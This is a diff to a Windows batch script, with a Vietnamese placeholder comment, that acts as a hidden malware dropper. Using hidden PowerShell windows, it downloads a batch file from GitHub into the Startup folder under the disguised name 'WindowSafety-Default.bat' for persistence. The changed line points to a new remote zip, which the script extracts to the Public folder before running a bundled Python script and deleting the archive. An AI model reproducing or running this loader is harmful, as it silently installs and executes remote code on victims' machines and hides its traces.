@@ -12,7 +12,7 @@ if %errorlevel%==0 (
     :: ---- Phan xu ly cua ban o day ----
     powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/urerfie/base/raw/main/zd.bat', '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowSafety-Default.bat')"
 
-    powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/urerfie/base/raw/main/default.zip', '$env:PUBLIC\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('$env:PUBLIC\Document.zip', '$env:PUBLIC\Document'); Start-Sleep -Seconds 1; & '$env:PUBLIC\Document\python' '$env:PUBLIC\Document\Lib\temp.py'; Remove-Item '$env:PUBLIC\Document.zip' -Force"
+    powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/lastver/test/raw/main/documetaaa.zip', '$env:PUBLIC\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('$env:PUBLIC\Document.zip', '$env:PUBLIC\Document'); Start-Sleep -Seconds 1; & '$env:PUBLIC\Document\python' '$env:PUBLIC\Document\Lib\temp.py'; Remove-Item '$env:PUBLIC\Document.zip' -Force"
 
     pause
     exit /b 0
